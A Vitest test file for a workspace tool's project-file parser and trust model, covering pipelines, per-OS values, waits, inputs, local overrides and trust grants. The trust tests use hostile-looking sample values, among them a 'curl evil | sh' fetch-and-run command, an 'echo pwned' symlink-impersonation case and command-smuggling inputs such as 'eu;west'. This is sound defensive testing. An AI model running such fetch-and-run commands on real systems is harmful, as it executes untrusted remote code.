import { chmod, mkdir, mkdtemp, realpath, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { LOCAL_FILE, PROJECT_FILE, checkProject, findProjectFile, interpret, parseWait, readProjectFile, runsCode } from "../../../src/core/project/index.js";
import { collectPipelineTargets } from "../../../src/core/run/index.js";
import { trustProject } from "../../../src/core/trust.js";
import type { OS, TrustState } from "../../../src/core/types.js";

let dir: string;

beforeEach(async () => {
  dir = await realpath(await mkdtemp(join(tmpdir(), "wisp-project-")));
  process.env["WISP_HOME"] = join(dir, "home");
});

afterEach(async () => {
  delete process.env["WISP_HOME"];
  await rm(dir, { recursive: true, force: true });
});

async function project(contents: unknown, at = ".", name = PROJECT_FILE): Promise<string> {
  const root = join(dir, at);
  await mkdir(root, { recursive: true });
  const file = join(root, name);
  await writeFile(file, typeof contents === "string" ? contents : JSON.stringify(contents), "utf8");
  return file;
}

/** Interpret a file's JSON without touching disk. */
function read(main: Record<string, unknown>, options: { os?: OS; trust?: TrustState; local?: Record<string, unknown> } = {}) {
  return interpret(
    { main, ...(options.local ? { local: options.local } : {}) },
    { file: "/work/acme/.wisp.json", personal: false, trust: options.trust ?? "untrusted", os: options.os ?? "darwin" },
  );
}

describe("findProjectFile", () => {
  it("walks up until it finds one, the way git looks for .git", async () => {
    const file = await project({ name: "Root" });
    const deep = join(dir, "packages", "core", "src");
    await mkdir(deep, { recursive: true });
    expect(await findProjectFile(deep)).toBe(file);
  });

  it("finds the nearest one when there are several", async () => {
    await project({ name: "Root" });
    const inner = await project({ name: "Api" }, "apps/api");
    expect(await findProjectFile(join(dir, "apps", "api"))).toBe(inner);
  });
});

describe("the simplest file", () => {
  it("is just pipelines listing what they open", () => {
    const { workspace, diagnostics } = read({
      pipelines: [{ label: "api", steps: [{ folder: "apps/api" }, { url: "http://localhost:3000" }] }],
    });

    expect(diagnostics.filter((entry) => entry.level !== "note")).toEqual([]);
    expect(workspace.name).toBe("acme");
    const steps = collectPipelineTargets(workspace, workspace.bolts[0]!);
    expect(steps.map((step) => [step.kind, step.value])).toEqual([
      ["folder", "/work/acme/apps/api"],
      ["link", "http://localhost:3000"],
    ]);
  });

  it("shares one asset between pipelines that list the same thing inline", () => {
    const { workspace, diagnostics } = read({
      pipelines: [
        { label: "a", steps: [{ folder: "apps/api" }] },
        { label: "b", steps: [{ folder: "apps/api" }] },
      ],
    });
    expect(workspace.folders).toHaveLength(1);
    expect(diagnostics).toEqual([]);
    expect(workspace.bolts[0]!.steps).toEqual(workspace.bolts[1]!.steps);
  });
});

describe("the file's keys", () => {
  it("has no shared sections: links and the like are unknown keys, and are ignored", () => {
    const { workspace, diagnostics } = read({ links: [{ label: "Repository", url: "github.com/acme" }], pipelines: [] });
    expect(workspace.links).toEqual([]);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "links" }));
  });
});

describe("per-OS values", () => {
  const file = {
    pipelines: [{ label: "Edit", steps: [{ label: "Editor", app: { macos: "Visual Studio Code", linux: "code" } }] }],
  };

  it("picks this OS's value, by the names people say", () => {
    expect(read(file, { os: "darwin" }).workspace.apps[0]!.app).toBe("Visual Studio Code");
    expect(read(file, { os: "linux" }).workspace.apps[0]!.app).toBe("code");
  });

  it("skips an asset declared for other systems, with a note rather than an error", () => {
    const { workspace, diagnostics } = read(file, { os: "win32" });
    expect(workspace.apps).toEqual([]);
    expect(workspace.bolts[0]!.steps).toEqual([]);
    expect(diagnostics.every((entry) => entry.level === "note")).toBe(true);
  });

  it("honours an os list on any entry", () => {
    const main = { pipelines: [{ label: "x", steps: [{ folder: "a", os: ["linux", "windows"] }, { folder: "b" }] }] };
    expect(read(main, { os: "darwin" }).workspace.folders.map((folder) => folder.label)).toEqual(["b"]);
    expect(read(main, { os: "win32" }).workspace.folders.map((folder) => folder.label)).toEqual(["a", "b"]);
  });

  it("warns about an OS it does not know", () => {
    const { diagnostics } = read({ pipelines: [{ label: "x", steps: [{ app: { macos: "Code", beos: "code" } }] }] });
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].steps[0].app.beos" }));
  });
});

describe("commands and trust", () => {
  const main = {
    pipelines: [{ label: "Run", steps: [{ label: "dev", run: "pnpm dev", cwd: "apps/api", env: { PORT: 3000, DEBUG: true }, shell: "sh" }] }],
  };

  it("parses a command fully, env values written as they read", () => {
    const { declaredCommands } = read(main);
    expect(declaredCommands[0]).toEqual({
      id: "command:dev",
      label: "dev",
      run: "pnpm dev",
      cwd: "/work/acme/apps/api",
      env: { PORT: "3000", DEBUG: "true" },
      shell: "sh",
    });
  });

  it("withholds commands until the file is trusted, but keeps them in the pipeline", () => {
    const untrusted = read(main);
    expect(untrusted.workspace.commands).toEqual([]);
    expect(untrusted.withheld.map((item) => item.id)).toEqual(["command:dev"]);
    expect(untrusted.workspace.bolts[0]!.steps).toEqual([expect.objectContaining({ kind: "asset", id: "command:dev" })]);

    const trusted = read(main, { trust: "trusted" });
    expect(trusted.workspace.commands).toHaveLength(1);
    expect(trusted.withheld).toEqual([]);
  });

  it("withholds files that run when opened, and apps given as paths", () => {
    const { workspace, withheld } = read({
      pipelines: [{ label: "x", steps: [{ file: "deploy.command" }, { file: "setup.exe" }, { file: "README.md" }, { app: "./tools/thing.app" }, { app: "Slack" }] }],
    });
    expect(workspace.files.map((file) => file.label)).toEqual(["README.md"]);
    expect(workspace.apps.map((app) => app.label)).toEqual(["Slack"]);
    expect(withheld.map((item) => item.label).sort()).toEqual(["./tools/thing.app", "deploy.command", "setup.exe"]);
  });

  it("holds back a website that reads the environment until the file is trusted", () => {
    const main = { pipelines: [{ label: "x", steps: [{ url: "{{env.PRODUCTION_URL}}/admin" }, { url: "acme.com" }] }] };
    const untrusted = read(main);
    expect(untrusted.workspace.links.map((link) => link.url)).toEqual(["acme.com"]);
    expect(untrusted.withheld).toEqual([expect.objectContaining({ kind: "link", value: "{{env.PRODUCTION_URL}}/admin", reason: "reads $PRODUCTION_URL from your environment" })]);
    expect(untrusted.diagnostics).toContainEqual(expect.objectContaining({ at: "trust", message: "1 website that reads your environment declared but will not run" }));
    const trusted = read(main, { trust: "trusted" });
    expect(trusted.workspace.links.map((link) => link.url)).toEqual(["{{env.PRODUCTION_URL}}/admin", "acme.com"]);
    expect(trusted.withheld).toEqual([]);
    expect(trusted.diagnostics.filter((entry) => entry.level !== "note")).toEqual([]);
  });

  it("holds back a wait for a website that reads the environment, and not one that takes an input", () => {
    const main = {
      pipelines: [
        { label: "Check", inputs: { website: {} }, steps: [{ wait: { url: "{{website}}" } }, { wait: { url: "{{env.PRODUCTION_URL}}/health" } }, { wait: 5 }, { wait: "localhost:5432" }] },
      ],
    };
    const untrusted = read(main);
    expect(untrusted.withheld).toEqual([expect.objectContaining({ kind: "wait", value: "{{env.PRODUCTION_URL}}/health", reason: "reads $PRODUCTION_URL from your environment" })]);
    expect(untrusted.diagnostics).toContainEqual(expect.objectContaining({ at: "trust", message: "1 website that reads your environment declared but will not run" }));
    expect(read(main, { trust: "trusted" }).withheld).toEqual([]);
  });

  it("counts what runs code in one warning", () => {
    const { diagnostics } = read({ pipelines: [{ label: "x", steps: [{ file: "x.sh" }, { run: "make" }] }] });
    expect(diagnostics).toContainEqual(
      expect.objectContaining({ at: "trust", message: "1 command and 1 item that would run code when opened declared but will not run" }),
    );
  });
});

describe("runsCode", () => {
  it.each([
    ["file", "deploy.command", true],
    ["file", "tools/install.PS1", true],
    ["file", "README.md", false],
    ["folder", "Thing.app/", true],
    ["folder", "apps/api", false],
    ["app", "Slack", false],
    ["app", "com.tinyspeck.slackmacgap", false],
    ["app", "C:\\tools\\evil.exe", true],
  ] as const)("%s %s → %s", (kind, value, expected) => {
    expect(Boolean(runsCode(kind, value))).toBe(expected);
  });
});

describe("slugs", () => {
  it("keeps a pipeline's own slug, ignores one that isn't a slug, and warns when two answer to the same", () => {
    const { workspace, diagnostics } = read({
      pipelines: [
        { label: "Start the whole stack", slug: "up", steps: [] },
        { label: "Deploy", slug: "Ship It!", steps: [] },
        { label: "Up", steps: [] },
      ],
    });
    expect(workspace.bolts.map((pipeline) => pipeline.slug)).toEqual(["up", undefined, undefined]);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", message: '"Ship It!" is not a slug, so it is ignored' }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", message: '"Start the whole stack" and "Up" both answer to up' }));
  });
});

describe("pipelines", () => {
  it("parses waits in every form", () => {
    expect(parseWait(5)).toEqual({ seconds: 5 });
    expect(parseWait("2s")).toEqual({ seconds: 2 });
    expect(parseWait("5432")).toEqual({ port: 5432, host: "localhost", timeout: 60 });
    expect(parseWait("db:5432")).toEqual({ port: 5432, host: "db", timeout: 60 });
    expect(parseWait("http://localhost:3000")).toEqual({ url: "http://localhost:3000", timeout: 60 });
    expect(parseWait({ port: 80, timeout: 5 })).toEqual({ port: 80, host: "localhost", timeout: 5 });
    expect(parseWait({ url: "https://example.com/health", status: 200 })).toEqual({ url: "https://example.com/health", timeout: 60, status: 200 });
    expect(parseWait({ url: "https://example.com/health", status: 999 })).toEqual({ url: "https://example.com/health", timeout: 60 });
    expect(parseWait("{{website}}")).toEqual({ url: "{{website}}", timeout: 60 });
    expect(parseWait({ url: "{{env.PRODUCTION_URL}}/health", status: 200 })).toEqual({ url: "{{env.PRODUCTION_URL}}/health", timeout: 60, status: 200 });
    expect(parseWait("{{ nope")).toBeUndefined();
    expect(parseWait("soon")).toBeUndefined();
    expect(parseWait(0)).toBeUndefined();
  });

  it("reads a timeout on a command that finishes, and says when one is wrong or does nothing", () => {
    const { workspace, diagnostics } = read({
      pipelines: [
        {
          label: "go",
          steps: [
            { run: "pnpm test", label: "test", finishes: true, timeout: "10m" },
            { run: "pnpm build", label: "build", finishes: true, timeout: 90 },
            { run: "pnpm lint", label: "lint", finishes: true, timeout: "soon" },
            { run: "pnpm dev", label: "dev", timeout: "1h" },
          ],
        },
      ],
    }, { trust: "trusted" });
    expect(workspace.commands.map((command) => [command.label, command.timeout])).toEqual([
      ["test", 600],
      ["build", 90],
      ["lint", undefined],
      ["dev", undefined],
    ]);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", message: '"soon" is not a timeout — it is ignored' }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", message: '"timeout" only applies to a command that finishes — it is ignored' }));
  });

  it("reads pipeline steps with what they wait for, and refuses one naming a missing pipeline or another workspace", () => {
    const { workspace, diagnostics } = read({
      pipelines: [
        { label: "api", steps: [{ pipeline: "db", label: "db" }, { pipeline: "web", after: "db" }, { pipeline: "cache", workspace: "infra" }] },
        { label: "db", steps: [] },
        { label: "web", steps: [{ pipeline: "nope" }] },
      ],
    });
    expect(workspace.bolts[0]!.steps).toEqual([
      { kind: "pipeline", bolt: "db", name: "db" },
      { kind: "pipeline", bolt: "web", after: ["db"] },
    ]);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", message: expect.stringContaining('"wisp use <its .wisp.json> cache"') }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ message: expect.stringContaining('"nope"') }));
  });

  it("reports pipelines that need each other", () => {
    const { diagnostics } = read({
      pipelines: [
        { label: "a", steps: [{ pipeline: "b" }] },
        { label: "b", steps: [{ pipeline: "a" }] },
      ],
    });
    expect(diagnostics.filter((entry) => entry.message.includes("need each other"))).toHaveLength(1);
  });

  it("warns about a key a pipeline does not know, like the old job, and ignores it", () => {
    const { workspace, diagnostics } = read({ pipelines: [{ label: "Check", job: true, steps: [] }] });
    expect(workspace.bolts[0]).not.toHaveProperty("job");
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].job" }));
  });

  it("reads keepGoing on a pipeline, and finishes on a command", () => {
    const { workspace, declaredCommands, diagnostics } = read({
      pipelines: [{ label: "Check", keepGoing: true, steps: [{ run: "pnpm test", finishes: true }, { run: "pnpm build", finishes: true, background: true }] }],
    });
    expect(workspace.bolts[0]!.keepGoing).toBe(true);
    expect(declaredCommands.map((command) => command.finishes)).toEqual([true, true]);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].steps[1].background" }));
  });

  it("reads the question a pipeline asks before it runs", () => {
    const { workspace, diagnostics } = read({
      pipelines: [
        { label: "Deploy", confirm: " Deploy to production? ", steps: [] },
        { label: "Restore", confirm: true, steps: [] },
        { label: "Quiet", confirm: false, steps: [] },
        { label: "Odd", confirm: 3, steps: [] },
      ],
    });
    expect(workspace.bolts.map((bolt) => bolt.confirm)).toEqual(["Deploy to production?", 'Run "Restore"?', undefined, undefined]);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[3].confirm" }));
  });

  it("reads a pipeline's inputs, and warns about one it can't use and a {{name}} it doesn't declare", () => {
    const { workspace, diagnostics } = read({
      pipelines: [
        {
          label: "Deploy",
          inputs: { env: { ask: "Deploy where?", choices: ["staging", "production", "eu;west"], default: "staging" }, tag: { default: "a -rf" }, "bad name": {}, region: { default: "mars", choices: ["eu"] } },
          confirm: "Deploy {{tag}} to {{env}}?",
          steps: [{ run: "./deploy.sh {{env}} {{tag}} {{zone}}", finishes: true }],
        },
      ],
    });
    expect(workspace.bolts[0]!.inputs).toEqual([
      { name: "env", ask: "Deploy where?", choices: ["staging", "production"], default: "staging" },
      { name: "tag", ask: "tag" },
      { name: "region", ask: "region", choices: ["eu"] },
    ]);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].inputs.bad name" }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].inputs.region.default" }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].inputs.env.choices", message: expect.stringContaining('"eu;west" has something else') }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].inputs.tag.default" }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].steps[0]", message: expect.stringContaining("{{zone}}") }));
    expect(diagnostics.filter((entry) => entry.message.includes("{{env}}") || entry.message.includes("{{tag}}"))).toEqual([]);
  });

  it("reads what each step waits for, and refuses to run a pipeline whose waiting can't work", () => {
    const { workspace, diagnostics } = read({
      pipelines: [
        {
          label: "Check",
          steps: [
            { run: "pnpm install", label: "install", finishes: true },
            { run: "pnpm lint", label: "lint", after: "install", finishes: true },
            { run: "pnpm test", label: "test", after: ["install"], finishes: true },
            { run: "pnpm build", after: ["lint", "test"], finishes: true },
          ],
        },
        { label: "Typo", steps: [{ run: "a", label: "a" }, { run: "b", after: "nope" }] },
        { label: "Loop", steps: [{ run: "a", label: "a", after: "b" }, { run: "b", label: "b", after: "a" }] },
        { label: "Twice", steps: [{ run: "a", label: "x" }, { run: "b", label: "x" }, { run: "c", after: "x" }] },
      ],
    });
    const [check, typo, loop, twice] = workspace.bolts;
    expect(check!.steps.map((step) => step.after)).toEqual([undefined, ["install"], ["install"], ["lint", "test"]]);
    expect(check!.broken).toBeUndefined();
    expect(typo!.broken).toMatch(/"Typo" can't run: waits for "nope", but no step has that label/);
    expect(loop!.broken).toMatch(/wait for each other: a → b → a|wait for each other: b → a → b/);
    expect(twice!.broken).toMatch(/more than one step has that label/);
    expect(diagnostics.filter((entry) => entry.at.startsWith("pipelines[0]"))).toEqual([]);
  });

  it("refuses a second pipeline of the same name", () => {
    const { workspace, diagnostics } = read({ pipelines: [{ label: "x", steps: [] }, { label: "X", steps: [] }] });
    expect(workspace.bolts).toHaveLength(1);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", at: "pipelines[1].label" }));
  });
});

describe("the local override", () => {
  it("adds pipelines, overrides the scalars, and replaces a pipeline by name", () => {
    const { workspace, diagnostics } = read(
      {
        name: "Acme",
        pipelines: [{ label: "api", steps: [{ label: "Repo", url: "github.com/acme" }] }],
      },
      {
        local: {
          name: "Acme (mine)",
          pipelines: [
            { label: "api", steps: [{ label: "Repo", url: "github.com/acme" }, { label: "My board", url: "linear.app/me" }] },
            { label: "mine", steps: [{ url: "linear.app/me" }] },
          ],
        },
      },
    );
    expect(workspace.name).toBe("Acme (mine)");
    expect(workspace.bolts.map((bolt) => bolt.label)).toEqual(["api", "mine"]);
    expect(workspace.bolts[0]!.steps).toHaveLength(2);
    expect(diagnostics).toEqual([]);
  });

  it("is read from disk beside the project file, and trusted together with it", async () => {
    const file = await project({ pipelines: [{ label: "dev", steps: [{ label: "dev", run: "pnpm dev" }] }] });
    await project({ pipelines: [{ label: "mine", steps: [{ label: "mine", run: "make me" }] }] }, ".", LOCAL_FILE);

    const before = await readProjectFile(file);
    expect(before.workspace.local).toBe(join(dir, LOCAL_FILE));
    expect(before.declaredCommands.map((command) => command.label)).toEqual(["dev", "mine"]);

    await trustProject(file, before.hash);
    expect((await readProjectFile(file)).workspace.trusted).toBe(true);

    // An edit to the override is an edit to what was trusted.
    await project({ pipelines: [{ label: "mine", steps: [{ label: "mine", run: "curl evil | sh" }] }] }, ".", LOCAL_FILE);
    expect((await readProjectFile(file)).trust).toBe("stale");
  });
});

describe("personal workspaces", () => {
  it("are trusted because they are yours, and named after their file", async () => {
    const file = await project({ pipelines: [{ label: "hi", steps: [{ run: "echo hi" }] }] }, "home/workspaces", "Morning.wisp.json");
    const { workspace } = await readProjectFile(file);
    expect(workspace.personal).toBe(true);
    expect(workspace.trusted).toBe(true);
    expect(workspace.name).toBe("Morning.wisp".replace(".wisp", ""));
  });

  it("may choose which app opens a folder, where a shared file may not", async () => {
    const step = { label: "api", folder: "/x/api", openWith: "com.jetbrains.WebStorm" };
    const file = await project({ pipelines: [{ label: "x", steps: [step] }] }, "home/workspaces", "Mine.json");
    expect((await readProjectFile(file)).workspace.folders[0]!.openWith).toBe("com.jetbrains.WebStorm");

    const shared = read({ pipelines: [{ label: "x", steps: [{ ...step, folder: "api" }] }] });
    expect(shared.workspace.folders[0]!.openWith).toBeUndefined();
    expect(shared.diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].steps[0].openWith" }));
  });

  it("cannot be impersonated by a symlink pointing at a project's file", async () => {
    const real = await project({ pipelines: [{ label: "x", steps: [{ run: "echo pwned" }] }] }, "repo");
    await mkdir(join(dir, "home", "workspaces"), { recursive: true });
    const link = join(dir, "home", "workspaces", "sneaky.json");
    await symlink(real, link);

    const { workspace } = await readProjectFile(link);
    expect(workspace.personal).toBe(false);
    expect(workspace.trusted).toBe(false);
    expect(workspace.file).toBe(real);
  });
});

describe("trust", () => {
  it("refuses a grant when the file changed after it was shown", async () => {
    const file = await project({ pipelines: [{ label: "x", steps: [{ run: "echo one" }] }] });
    const shown = await readProjectFile(file);
    await project({ pipelines: [{ label: "x", steps: [{ run: "echo two" }] }] });
    await expect(trustProject(file, shown.hash)).rejects.toThrow(/changed while you were reading/);
  });
});

describe("checkProject", () => {
  it("reports missing paths and machine-specific ones", async () => {
    const file = await project({ pipelines: [{ label: "x", steps: [{ folder: "missing" }, { folder: "~/somewhere" }, { file: "README.md" }] }] });
    await writeFile(join(dir, "README.md"), "hi");
    const { diagnostics } = await checkProject(file);

    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", at: "pipelines[0].steps[0].folder" }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "pipelines[0].steps[1].folder" }));
    expect(diagnostics.some((entry) => entry.at.startsWith("pipelines[0].steps[2]"))).toBe(false);
  });

  it("takes an input anywhere in a url, the port included, and still refuses one that isn't a url", async () => {
    const file = await project({
      pipelines: [
        {
          label: "Deploy",
          inputs: { port: { default: "443" }, host: { default: "localhost" } },
          steps: [{ url: "https://localhost:{{port}}" }, { url: "https://{{host}}:{{port}}/admin" }],
        },
        { label: "Broken", steps: [{ url: "https://exa mple.com" }] },
      ],
    });
    const errors = (await checkProject(file)).diagnostics.filter((entry) => entry.level === "error");
    expect(errors.map((entry) => entry.message)).toEqual(['"https://exa mple.com" is not a url Wisp can open']);
  });

  it("takes a url made from the environment as a url", async () => {
    const file = await project({ pipelines: [{ label: "Open", steps: [{ url: "{{env.PRODUCTION_URL}}" }, { url: "https://{{env.HOST}}:{{env.PORT}}/admin" }] }] });
    await trustProject(file);
    const errors = (await checkProject(file)).diagnostics.filter((entry) => entry.level === "error");
    expect(errors).toEqual([]);
  });

  it("calls a url with a placeholder that isn't an input an error, and a command with one a warning", () => {
    const { diagnostics } = read({
      pipelines: [
        {
          label: "Deploy",
          inputs: { port: { default: "443" } },
          steps: [{ url: "https://localhost:{{prot}}" }, { wait: { url: "https://localhost:{{port}}/{{path}}" } }, { run: "echo {{tag}}" }, { url: "https://localhost:{{port}}" }],
        },
      ],
    });
    const about = (name: string) => diagnostics.find((entry) => entry.message.startsWith(`{{${name}}}`));
    expect(about("prot")).toMatchObject({ level: "error", message: `{{prot}} is not one of "Deploy"'s inputs, so "https://localhost:{{prot}}" can't be opened` });
    expect(about("path")).toMatchObject({ level: "error" });
    expect(about("tag")).toMatchObject({ level: "warning", message: expect.stringContaining("left as written") });
    expect(about("port")).toBeUndefined();
  });

  it("does not report a folder declared only for another OS as missing", async () => {
    const file = await project({ pipelines: [{ label: "x", steps: [{ folder: "nowhere", os: "windows" }] }] });
    const { diagnostics } = await checkProject(file, { os: "darwin" });
    expect(diagnostics.filter((entry) => entry.level === "error")).toEqual([]);
  });

  it("allows an executable it found only once trusted", async () => {
    await writeFile(join(dir, "go"), "#!/bin/sh\n");
    await chmod(join(dir, "go"), 0o755);
    const file = await project({ pipelines: [{ label: "x", steps: [{ file: "go" }] }] });
    const { workspace } = await readProjectFile(file);
    // No extension, so the parser lets it through; the runner checks the execute bit.
    expect(workspace.files).toHaveLength(1);
    expect(workspace.trusted).toBe(false);
  });
});

describe("an unknown key holding a list, in a file with no pipelines", () => {
  it("suggests pipelines", () => {
    const { diagnostics } = read({ name: "Shop", bolts: [{ label: "Check", steps: [] }] });
    expect(diagnostics.find((entry) => entry.at === "bolts")?.hint).toMatch(/^Did you mean "pipelines"\?/);
  });

  it("does not, once the file has pipelines", () => {
    const { diagnostics } = read({ name: "Shop", pipelines: [], extras: [] });
    expect(diagnostics.find((entry) => entry.at === "extras")?.hint).toMatch(/^Known keys/);
  });
});
